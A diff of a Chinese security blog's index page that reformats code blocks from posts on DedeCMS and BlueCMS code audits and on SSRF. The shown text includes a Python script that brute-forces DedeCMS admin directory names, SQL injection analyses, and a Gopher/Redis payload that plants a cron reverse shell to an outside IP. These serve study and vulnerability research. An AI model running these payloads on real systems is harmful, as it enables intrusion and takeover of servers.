+                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
+            else:
+                return  back_dir
+
+def find_page(response):
+    if &quot;Upload filetype not allow !&quot; not in response.text and response.status_code == 200:
+        return 1
+
+def main():
+    characters = &quot;abcdefghijklmnopqrstuvwxyz0123456789_!#&quot;
+    url = raw_input(&quot;Please input your target:&quot;)
+    data = {
+        &quot;_FILES[hpdoger][tmp_name]&quot;: &quot;./{p}&lt;&lt;/images/adminico.gif&quot;,
+        &quot;_FILES[hpdoger][name]&quot;: 0,
+        &quot;_FILES[hpdoger][size]&quot;: 0,
+        &quot;_FILES[hpdoger][type]&quot;: &quot;image/gif&quot;
+    }
+
+    back_dir = guess_back_dir(url,data,characters)
+    name = guess_rest_dir(back_dir,url,data,characters)
+    print(&quot;The background address is[+]:&quot;,name)
+
+
+if __name__ == &#39;__main__&#39;:
+    main()</code></pre><h3 id="最后穿插一个关于FILE变量的小知识点"><a href="#最后穿插一个关于FILE变量的小知识点" class="headerlink" title="最后穿插一个关于FILE变量的小知识点"></a>最后穿插一个关于FILE变量的小知识点</h3><p>$_FILES[“file”][“name”] - 被上传文件的名称<br>$_FILES[“file”][“type”] - 被上传文件的类型<br>$_FILES[“file”][“size”] - 被上传文件的大小，以字节计<br>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称<br>$_FILES[“file”][“error”] - 由文件上传导致的错误代码</p>
 <h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>代码审计之DedeCMS V5.7 SP2后台存在代码执行漏洞(<a href="https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/" target="_blank" rel="noopener">https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</a>)</p>
 <p>奇技淫巧 | DEDECMS找后台目录(<a href="https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/</a>)</p>
 <p>膜前辈师傅们~</p>
@@ -442,7 +622,7 @@
             </div>
             <div class="continue">
             <a href="/2018/08/21/Dedecms V5.7 SP2代码审计/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -474,50 +654,115 @@
 <p>从今天起，至未来的一个月，会把学习的全部精力都投入到审计方向，立下flag:未来半个月内拿自己的cve</p>
 <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>cms: bulecms 1.6 sp1<br>php: 5.4 + mysql 5.5.53</p>
 <h2 id="sql注入一"><a href="#sql注入一" class="headerlink" title="sql注入一"></a>sql注入一</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>问题文件位于：/uploads/ad_js.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id);</span><br></pre></td></tr></table></figure>
-
-<p>变量未用单引号闭合，可能会引起注入</p>
+<pre><code>$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#39;ad&#39;).&quot; WHERE ad_id =&quot;.$ad_id);</code></pre><p>变量未用单引号闭合，可能会引起注入</p>
 <p>跟踪一下$ad_id，查找该参数如何获得</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br></pre></td></tr></table></figure>
-
-<p>trim去掉ad_id两侧空格，未过滤参数，可注入</p>
+<pre><code>$ad_id = !empty($_GET[&#39;ad_id&#39;]) ? trim($_GET[&#39;ad_id&#39;]) : &#39;&#39;;</code></pre><p>trim去掉ad_id两侧空格，未过滤参数，可注入</p>
 <p>再追踪一下getone()函数怎么定义的，一个定义mysql相关操作的文件位于/uploads/include/mysql.class.php：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getone($sql, $type=MYSQL_ASSOC)&#123;</span><br><span class="line">	$query = $this-&gt;query($sql,$this-&gt;linkid);</span><br><span class="line">	$row = mysql_fetch_array($query, $type);</span><br><span class="line">	return $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>追踪此类里query函数的定义：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function query($sql)&#123;</span><br><span class="line">	if(!$query=@mysql_query($sql, $this-&gt;linkid))&#123;</span><br><span class="line">		$this-&gt;dbshow(&quot;Query error:$sql&quot;);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		return $query;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>查询出错则dbshow进行报错，有结果则返回$query集合后，$row进行取值</p>
+<pre><code>    function getone($sql, $type=MYSQL_ASSOC){
+        $query = $this-&gt;query($sql,$this-&gt;linkid);
+        $row = mysql_fetch_array($query, $type);
+        return $row;
+    }</code></pre><p>追踪此类里query函数的定义：</p>
+<pre><code>    function query($sql){
+        if(!$query=@mysql_query($sql, $this-&gt;linkid)){
+            $this-&gt;dbshow(&quot;Query error:$sql&quot;);
+        }else{
+            return $query;
+        }
+    }</code></pre><p>查询出错则dbshow进行报错，有结果则返回$query集合后，$row进行取值</p>
 <h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="https://s1.ax1x.com/2018/08/16/PWEujK.jpg" alt></p>
 <h2 id="sql注入二"><a href="#sql注入二" class="headerlink" title="sql注入二"></a>sql注入二</h2><p>一开始审了一个前台/uploads/user.php的宽字节注入,记一下思路：</p>
 <p>在mysql.class.php中看到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query( &quot;SET NAMES gbk&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>看一下有没有进行addslashes过滤<br><img src="https://s1.ax1x.com/2018/08/16/PWEMnO.png" alt></p>
+<pre><code>mysql_query( &quot;SET NAMES gbk&quot;);</code></pre><p>看一下有没有进行addslashes过滤<br><img src="https://s1.ax1x.com/2018/08/16/PWEMnO.png" alt></p>
 <p>果然对POST\GET过滤，追踪deep_addslashes</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function deep_addslashes($str)</span><br><span class="line">&#123;</span><br><span class="line">	if(is_array($str))</span><br><span class="line">	&#123;</span><br><span class="line">		foreach($str as $key=&gt;$val)</span><br><span class="line">		&#123;</span><br><span class="line">			$str[$key] = deep_addslashes($val);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$str = addslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>function deep_addslashes($str)
+{
+    if(is_array($str))
+    {
+        foreach($str as $key=&gt;$val)
+        {
+            $str[$key] = deep_addslashes($val);
+        }
+    }
+    else
+    {
+        $str = addslashes($str);
+    }
+    return $str;
+}</code></pre><p>联想宽字节，先追踪一下处理表单的方法</p>
+<pre><code> elseif($act == &#39;index_login&#39;){
+     $user_name = !empty($_REQUEST[&#39;user_name&#39;]) ? trim($_REQUEST[&#39;user_name&#39;]) : &#39;&#39;;
+     $pwd = !empty($_REQUEST[&#39;pwd&#39;]) ? trim($_REQUEST[&#39;pwd&#39;]) : &#39;&#39;;
+     $remember = isset($_REQUEST[&#39;remember&#39;]) ? intval($_REQUEST[&#39;remember&#39;]) : 0;
+     if($user_name == &#39;&#39;){
+         showmsg(&#39;�û�������Ϊ��&#39;);
+     }
+     if($pwd == &#39;&#39;){
+         showmsg(&#39;���벻��Ϊ��&#39;);
+     }
+    $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;admin&#39;).&quot; WHERE admin_name=&#39;$user_name&#39;&quot;);
+    if($row[&#39;num&#39;] == 1){
+        showmsg(&#39;ϵͳ�û��鲻�ܴ�ǰ̨��¼&#39;);
+    }
+    $w = login($user_name, $pwd);
 
-<p>联想宽字节，先追踪一下处理表单的方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;index_login&apos;)&#123;</span><br><span class="line">	$user_name = !empty($_REQUEST[&apos;user_name&apos;]) ? trim($_REQUEST[&apos;user_name&apos;]) : &apos;&apos;;</span><br><span class="line">	$pwd = !empty($_REQUEST[&apos;pwd&apos;]) ? trim($_REQUEST[&apos;pwd&apos;]) : &apos;&apos;;</span><br><span class="line">	$remember = isset($_REQUEST[&apos;remember&apos;]) ? intval($_REQUEST[&apos;remember&apos;]) : 0;</span><br><span class="line">	if($user_name == &apos;&apos;)&#123;</span><br><span class="line">		showmsg(&apos;�û�������Ϊ��&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	if($pwd == &apos;&apos;)&#123;</span><br><span class="line">		showmsg(&apos;���벻��Ϊ��&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$user_name&apos;&quot;);</span><br><span class="line">if($row[&apos;num&apos;] == 1)&#123;</span><br><span class="line">	showmsg(&apos;ϵͳ�û��鲻�ܴ�ǰ̨��¼&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$w = login($user_name, $pwd);</span><br><span class="line"></span><br><span class="line">if(defined(&apos;UC_API&apos;) &amp;&amp; @include_once(BLUE_ROOT.&apos;uc_client/client.php&apos;))&#123;</span><br><span class="line">	list($uid, $username, $password, $email) = uc_user_login($user_name, $pwd);</span><br><span class="line">	if($uid&gt;0)&#123;</span><br><span class="line">		$password = md5($password);</span><br><span class="line">		if(!$w)&#123;</span><br><span class="line">			$db-&gt;query(&quot;INSERT INTO &quot;.table(&apos;user&apos;).&quot; (user_name, pwd, email, reg_time) VALUES (&apos;$username&apos;, &apos;$password&apos;, &apos;$email&apos;, &apos;$timestamp&apos;)&quot;); </span><br><span class="line">			$w = 1;</span><br><span class="line">		&#125;</span><br><span class="line">		$ucsynlogin = uc_user_synlogin($uid);</span><br><span class="line">	&#125;</span><br><span class="line">	elseif($uid === -1)&#123;</span><br><span class="line">		if($w == 1)&#123;</span><br><span class="line">			$user_info = $db-&gt;getone(&quot;SELECT email FROM &quot;.table(&apos;user&apos;).&quot; WHERE user_name=&apos;$user_name&apos;&quot;);</span><br><span class="line">			$uid = uc_user_register($user_name, $pwd, $user_info[&apos;email&apos;]);</span><br><span class="line">			if($uid &gt; 0) $ucsynlogin = uc_user_synlogin($uid);</span><br><span class="line">		&#125;else $w = -1;</span><br><span class="line">	&#125;</span><br><span class="line">	elseif($uid == -2)&#123;</span><br><span class="line">		showmsg(&apos;�������&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	echo $ucsynlogin;</span><br><span class="line">&#125;</span><br><span class="line">if($w == -1 || $w == 0)&#123;</span><br><span class="line">	showmsg(&apos;��������û��������벻��ȷ&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif($w == 1)&#123;</span><br><span class="line">	update_user_info($user_name);</span><br><span class="line">		if($remember==1)&#123;</span><br><span class="line">			setcookie(&apos;BLUE[user_id]&apos;, $_SESSION[&apos;user_id&apos;], time()+172800, $cookiepath, $cookiedomain);</span><br><span class="line">			setcookie(&apos;BLUE[user_name]&apos;, $user_name, time()+172800, $cookiepath, $cookiedomain);</span><br><span class="line">		setcookie(&apos;BLUE[user_pwd]&apos;, md5(md5($pwd).$_CFG[&apos;cookie_hash&apos;]), time()+172800, $cookiepath, $cookiedomain);</span><br><span class="line">		&#125;</span><br><span class="line">		showmsg(&apos;��ӭ�� &apos;.$user_name.&apos; ���������ڽ�ת����Ա����&apos;, &apos;user.php&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>追踪user_name怎么传入：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user_name = !empty($_REQUEST[&apos;user_name&apos;]) ? trim($_REQUEST[&apos;user_name&apos;]) : &apos;&apos;;</span><br></pre></td></tr></table></figure>
-
-<p>发现无过滤</p>
+    if(defined(&#39;UC_API&#39;) &amp;&amp; @include_once(BLUE_ROOT.&#39;uc_client/client.php&#39;)){
+        list($uid, $username, $password, $email) = uc_user_login($user_name, $pwd);
+        if($uid&gt;0){
+            $password = md5($password);
+            if(!$w){
+                $db-&gt;query(&quot;INSERT INTO &quot;.table(&#39;user&#39;).&quot; (user_name, pwd, email, reg_time) VALUES (&#39;$username&#39;, &#39;$password&#39;, &#39;$email&#39;, &#39;$timestamp&#39;)&quot;); 
+                $w = 1;
+            }
+            $ucsynlogin = uc_user_synlogin($uid);
+        }
+        elseif($uid === -1){
+            if($w == 1){
+                $user_info = $db-&gt;getone(&quot;SELECT email FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39;&quot;);
+                $uid = uc_user_register($user_name, $pwd, $user_info[&#39;email&#39;]);
+                if($uid &gt; 0) $ucsynlogin = uc_user_synlogin($uid);
+            }else $w = -1;
+        }
+        elseif($uid == -2){
+            showmsg(&#39;�������&#39;);
+        }
+        echo $ucsynlogin;
+    }
+    if($w == -1 || $w == 0){
+        showmsg(&#39;��������û��������벻��ȷ&#39;);
+    }
+    elseif($w == 1){
+        update_user_info($user_name);
+         if($remember==1){
+             setcookie(&#39;BLUE[user_id]&#39;, $_SESSION[&#39;user_id&#39;], time()+172800, $cookiepath, $cookiedomain);
+             setcookie(&#39;BLUE[user_name]&#39;, $user_name, time()+172800, $cookiepath, $cookiedomain);
+            setcookie(&#39;BLUE[user_pwd]&#39;, md5(md5($pwd).$_CFG[&#39;cookie_hash&#39;]), time()+172800, $cookiepath, $cookiedomain);
+         }
+         showmsg(&#39;��ӭ�� &#39;.$user_name.&#39; ���������ڽ�ת����Ա����&#39;, &#39;user.php&#39;);
+     }
+ }</code></pre><p>追踪user_name怎么传入：</p>
+<pre><code>$user_name = !empty($_REQUEST[&#39;user_name&#39;]) ? trim($_REQUEST[&#39;user_name&#39;]) : &#39;&#39;;</code></pre><p>发现无过滤</p>
 <p>再追踪一下对suername的sql语句如何执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$user_name&apos;&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>看到调用了getone()函数，第一个注入有介绍。</p>
+<pre><code>$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;admin&#39;).&quot; WHERE admin_name=&#39;$user_name&#39;&quot;);</code></pre><p>看到调用了getone()函数，第一个注入有介绍。</p>
 <p>再看到下面一句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($row[&apos;num&apos;] == 1)&#123;</span><br><span class="line">	showmsg(&apos;ϵͳ�û��鲻�ܴ�ǰ̨��¼&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在admin的表中查询admin_name表中是否有传入的user_name，若存在，$row[‘num’]值为1，然后执行showmsg函数，输出：“前台无法登陆”后返回主页。值为0进行以下操作：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$w = login($user_name, $pwd);</span><br></pre></td></tr></table></figure>
-
-<p>再追踪login函数得到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function login($user_name,$pwd)&#123;</span><br><span class="line">	global $db;</span><br><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;user&apos;).&quot; WHERE user_name=&apos;$user_name&apos;&quot;);</span><br><span class="line">if($row[&apos;num&apos;]==0)&#123;</span><br><span class="line">	$result = 0;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	$sql = &quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;user&apos;).&quot; WHERE user_name=&apos;$user_name&apos; and pwd=md5(&apos;$pwd&apos;)&quot;;</span><br><span class="line">		$user_num = $db-&gt;getone($sql);</span><br><span class="line">		if($user_num[&apos;num&apos;])&#123;</span><br><span class="line">			$result = 1;</span><br><span class="line">		&#125;else $result = -1;</span><br><span class="line">&#125;</span><br><span class="line">	return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>到这里我们可以理解，这个页面的登陆逻辑是这样的：</p>
+<pre><code>    if($row[&#39;num&#39;] == 1){
+        showmsg(&#39;ϵͳ�û��鲻�ܴ�ǰ̨��¼&#39;);
+    }</code></pre><p>在admin的表中查询admin_name表中是否有传入的user_name，若存在，$row[‘num’]值为1，然后执行showmsg函数，输出：“前台无法登陆”后返回主页。值为0进行以下操作：</p>
+<pre><code>$w = login($user_name, $pwd);</code></pre><p>再追踪login函数得到：</p>
+<pre><code> function login($user_name,$pwd){
+     global $db;
+    $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39;&quot;);
+    if($row[&#39;num&#39;]==0){
+        $result = 0;
+    }else{
+        $sql = &quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39; and pwd=md5(&#39;$pwd&#39;)&quot;;
+         $user_num = $db-&gt;getone($sql);
+         if($user_num[&#39;num&#39;]){
+             $result = 1;
+         }else $result = -1;
+    }
+     return $result;
+ }</code></pre><p>到这里我们可以理解，这个页面的登陆逻辑是这样的：</p>
 <p><strong>如果我们的用户名是admin表中用户名，则不允许登陆</strong><br><strong>若不是表中的用户名，则会进行user表的对比查询，再判断是否有这个用户</strong></p>
 <p>明确思路：盲注<br>注入是否成功的判断条件：$row[‘num’]返回值</p>
 <h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>success injection: <img src="https://s1.ax1x.com/2018/08/17/PWKfzj.jpg" alt></p>
@@ -529,7 +774,7 @@
             </div>
             <div class="continue">
             <a href="/2018/08/18/代码审计复现：Bluecms 1.6/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -640,7 +885,7 @@
             </div>
             <div class="continue">
             <a href="/2018/08/12/（转载） 基于 Token 的身份验证/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -674,46 +919,68 @@
 <p>我们可以利用curl进行抓取网页内容</p>
 <h3 id="伪造请求"><a href="#伪造请求" class="headerlink" title="伪造请求"></a>伪造请求</h3><p>通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。</p>
 <p>类似于这样的形式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip:port/ssrf.php?url=xxxx</span><br></pre></td></tr></table></figure>
-
-<p>我们构造一个url请求，server端接收并访问传入的url，然后会返回给客户端相应数据（如图片等）。正常情况下，服务端希望我们传入的url是一个正常的链接，可能是站内的图片、网链，也可能是站外的其它友链。php后端使用<strong>cURL</strong>初始化一个新的cURL会话并获取一个网页。</p>
+<pre><code>ip:port/ssrf.php?url=xxxx</code></pre><p>我们构造一个url请求，server端接收并访问传入的url，然后会返回给客户端相应数据（如图片等）。正常情况下，服务端希望我们传入的url是一个正常的链接，可能是站内的图片、网链，也可能是站外的其它友链。php后端使用<strong>cURL</strong>初始化一个新的cURL会话并获取一个网页。</p>
 <p>但是，如果我们通过curl允许的协议来传递给url这个参数一些邪恶的信息呢？后果可想而知</p>
 <h2 id="SSRF分析"><a href="#SSRF分析" class="headerlink" title="SSRF分析"></a>SSRF分析</h2><h3 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h3><p>ssrf漏洞代码，未作过滤</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// 创建一个新cURL资源</span><br><span class="line">$ch = curl_init(); </span><br><span class="line"></span><br><span class="line">// 设置URL和相应的选项</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&apos;url&apos;]); </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0); </span><br><span class="line"></span><br><span class="line">// 抓取URL并把它传递给浏览器</span><br><span class="line">curl_exec($ch); </span><br><span class="line"></span><br><span class="line">// 关闭cURL资源，并且释放系统资源</span><br><span class="line">curl_close($ch); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php 
+// 创建一个新cURL资源
+$ch = curl_init(); 
 
-<h3 id="file协议查看文件"><a href="#file协议查看文件" class="headerlink" title="file协议查看文件"></a>file协议查看文件</h3><p><img src="https://s1.ax1x.com/2018/08/10/P6BOht.png" alt></p>
+// 设置URL和相应的选项
+curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); 
+curl_setopt($ch, CURLOPT_HEADER, 0); 
+
+// 抓取URL并把它传递给浏览器
+curl_exec($ch); 
+
+// 关闭cURL资源，并且释放系统资源
+curl_close($ch); 
+?&gt;</code></pre><h3 id="file协议查看文件"><a href="#file协议查看文件" class="headerlink" title="file协议查看文件"></a>file协议查看文件</h3><p><img src="https://s1.ax1x.com/2018/08/10/P6BOht.png" alt></p>
 <p>我们url传入的file协议语句，会在服务会执行一个curl语句，返回查询的信息。这个是基于有回显的情况，不过现在很多php后端如果这样写的话：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)</span><br></pre></td></tr></table></figure>
-
-<p>协议就算失效了，这种方法失败</p>
+<pre><code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)</code></pre><p>协议就算失效了，这种方法失败</p>
 <h3 id="dict协议探测端口"><a href="#dict协议探测端口" class="headerlink" title="dict协议探测端口"></a>dict协议探测端口</h3><p>探测22端口(ssh服务)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port/ssrf.php?url=dict://127.0.0.1:22/info</span><br></pre></td></tr></table></figure>
-
-<p>服务端会执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;dict://127.0.0.1:22/info&apos;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s1.ax1x.com/2018/08/11/P6Rt78.png" alt></p>
+<pre><code>http://ip:port/ssrf.php?url=dict://127.0.0.1:22/info</code></pre><p>服务端会执行：</p>
+<pre><code>curl -v &#39;dict://127.0.0.1:22/info&#39;</code></pre><p><img src="https://s1.ax1x.com/2018/08/11/P6Rt78.png" alt></p>
 <p>探测3306端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port/ssrf.php?url=dict://127.0.0.1:3306</span><br><span class="line">/info</span><br></pre></td></tr></table></figure>
-
-<h3 id="Gopher协议攻击redis反弹shell"><a href="#Gopher协议攻击redis反弹shell" class="headerlink" title="Gopher协议攻击redis反弹shell"></a>Gopher协议攻击redis反弹shell</h3><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。<br>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/要反弹的公网ip/反弹端口 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br></pre></td></tr></table></figure>
-
-<p>这里网址以127.0.0.1，redis端口6379，公网ip为172.19.23.228且监听端口为2333为例<br>改成适配于 Gopher 协议的 URL：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>
-
